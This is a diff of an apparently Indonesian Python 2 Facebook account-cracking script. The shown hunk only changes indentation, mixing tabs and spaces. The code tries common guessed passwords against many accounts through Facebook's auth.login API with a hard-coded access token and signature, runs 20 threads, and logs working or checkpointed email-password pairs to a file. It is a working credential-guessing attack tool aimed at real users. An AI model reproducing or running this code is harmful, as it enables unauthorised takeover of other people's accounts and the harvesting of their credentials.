@@ -364,89 +364,89 @@ def pilih_indo():
 					CP.append(em)
 				else:
 					pw2 = v['first_name'].lower()+'12345'
-                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                    xo = json.load(data)
-                    if 'access_token' in xo:
-                        print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw2
-                        oke = open('done/indo.txt', 'a')
-                        oke.write('\n   [OK] '+em+' • '+pw2)
-                        oke.close()
-                        oks.append(em)
-                    else :
-                        if 'www.facebook.com' in xo['error_msg']:
-                            print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw2
-                            cek = open('done/indo.txt', 'a')
-                            cek.write('\n   [CP] '+em+' • '+pw2)
-                            cek.close()
-                            CP.append(em)
+                   	 		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                    			xo = json.load(data)
+                    			if 'access_token' in xo:
+                        			print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw2
+                        			oke = open('done/indo.txt', 'a')
+                        			oke.write('\n   [OK] '+em+' • '+pw2)
+                       				oke.close()
+                       				oks.append(em)
+              				else :
+                      				if 'www.facebook.com' in xo['error_msg']:
+                            				print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw2
+                            				cek = open('done/indo.txt', 'a')
+                            				cek.write('\n   [CP] '+em+' • '+pw2)
+                            				cek.close()
+                           				CP.append(em)
 						else:
 							pw3 = 'sayang'
-                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                            xo = json.load(data)
-                            if 'access_token' in xo:
-                                print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw3
-                                oke = open('done/indo.txt', 'a')
-                                oke.write('\n   [OK] '+em+' • '+pw3)
-                                oke.close()
-                                oks.append(em)
-                            else :
-                                if 'www.facebook.com' in xo['error_msg']:
-                                    print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw3
-                                    cek = open('done/indo.txt', 'a')
-                                    cek.write('\n   [CP] '+em+' • '+pw3)
-                                    cek.close()
-                                    CP.append(em)
+                            				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                            				xo = json.load(data)
+                            				if 'access_token' in xo:
+                                				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw3
+                                				oke = open('done/indo.txt', 'a')
+                                				oke.write('\n   [OK] '+em+' • '+pw3)
+                                				oke.close()
+                                				oks.append(em)
+                           				else :
+                                				if 'www.facebook.com' in xo['error_msg']:
+                                    					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw3
+                                    					cek = open('done/indo.txt', 'a')
+                                    					cek.write('\n   [CP] '+em+' • '+pw3)
+                                    					cek.close()
+                                    					CP.append(em)
 								else:
 									pw4 = 'bismillah'
-                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                    xo = json.load(data)
-                                    if 'access_token' in xo:
-                                        print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw4
-                                        oke = open('done/indo.txt', 'a')
-                                        oke.write('\n   [OK] '+em+' • '+pw4)
-                                        oke.close()
-                                        oks.append(em)
-                                    else :
-                                        if 'www.facebook.com' in xo['error_msg']:
-                                            print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw4
-                                            cek = open('done/indo.txt', 'a')
-                                            cek.write('\n   [CP] '+em+' • '+pw4)
-                                            cek.close()
-                                            CP.append(em)
+                                    					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                    					xo = json.load(data)
+                                    					if 'access_token' in xo:
+                                        					print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw4
+                                        					oke = open('done/indo.txt', 'a')
+                                        					oke.write('\n   [OK] '+em+' • '+pw4)
+                                        					oke.close()
+                                        					oks.append(em)
+                                    					else :
+                                        					if 'www.facebook.com' in xo['error_msg']:
+                                            						print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw4
+                                            						cek = open('done/indo.txt', 'a')
+                                            						cek.write('\n   [CP] '+em+' • '+pw4)
+                                            						cek.close()
+                                            						CP.append(em)
 										else:
 											pw5 = 'anjing'
-                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                            xo = json.load(data)
-                                            if 'access_token' in xo:
-                                                print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw5
-                                                oke = open('done/indo.txt', 'a')
-                                                oke.write('\n   [OK] '+em+' • '+pw5)
-                                                oke.close()
-                                                oks.append(em)
-                                            else :
-                                                if 'www.facebook.com' in xo['error_msg']:
-                                                    print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw5
-                                                    cek = open('done/indo.txt', 'a')
-                                                    cek.write('\n   [CP] '+em+' • '+pw5)
-                                                    cek.close()
-                                                    CP.append(em)
+                                            						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                            						xo = json.load(data)
+                                            						if 'access_token' in xo:
+                                                						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw5
+                                                						oke = open('done/indo.txt', 'a')
+                                                						oke.write('\n   [OK] '+em+' • '+pw5)
+                                                						oke.close()
+                                                						oks.append(em)
+                                            						else :
+                                                						if 'www.facebook.com' in xo['error_msg']:
+                                                   						 	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw5
+                                                    							cek = open('done/indo.txt', 'a')
+                                                    							cek.write('\n   [CP] '+em+' • '+pw5)
+                                                    							cek.close()
+                                                    							CP.append(em)
 												else:
 													pw6 = '123456'
-                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                                                    xo = json.load(data)
-                                                    if 'access_token' in xo:
-                                                        print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw6
-                                                        oke = open('done/indo.txt', 'a')
-                                                        oke.write('\n   [OK] '+em+' • '+pw6)
-                                                        oke.close()
-                                                        oks.append(em)
-                                                    else :
-                                                        if 'www.facebook.com' in xo['error_msg']:
-                                                            print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw6
-                                                            cek = open('done/indo.txt', 'a')
-                                                            cek.write('\n   [CP] '+em+' • '+pw6)
-                                                            cek.close()
-                                                            CP.append(em)
+                                                    							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(em)+"&locale=en_US&password="+(pw6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                                    							xo = json.load(data)
+                                                    							if 'access_token' in xo:
+                                                        							print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw6
+                                                        							oke = open('done/indo.txt', 'a')
+                                                        							oke.write('\n   [OK] '+em+' • '+pw6)
+                                                        							oke.close()
+                                                        							oks.append(em)
+                                                   							else :
+                                                        							if 'www.facebook.com' in xo['error_msg']:
+                                                           								print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw6
+                                                            								cek = open('done/indo.txt', 'a')
+                                                            								cek.write('\n   [CP] '+em+' • '+pw6)
+                                                            								cek.close()
+                                                            								CP.append(em)
 		except:
 			pass
 	p = ThreadPool(20)
